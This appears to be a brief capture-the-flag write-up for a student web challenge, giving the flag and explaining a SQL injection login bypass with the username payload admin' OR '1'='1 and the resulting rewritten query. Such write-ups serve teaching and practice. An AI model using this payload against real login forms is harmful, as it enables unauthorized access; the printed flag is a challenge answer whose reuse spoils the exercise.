# Solution to Easy Web Exploitation
Flag - CompSoc{0N3!=0}

1. On homepage enter the username to be  `admin' OR '1'='1`

This is fed into the system and causes the query which is originally this

```sql
SELECT * FROM users WHERE username='{username}' AND password='{password}'
```
to this
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```
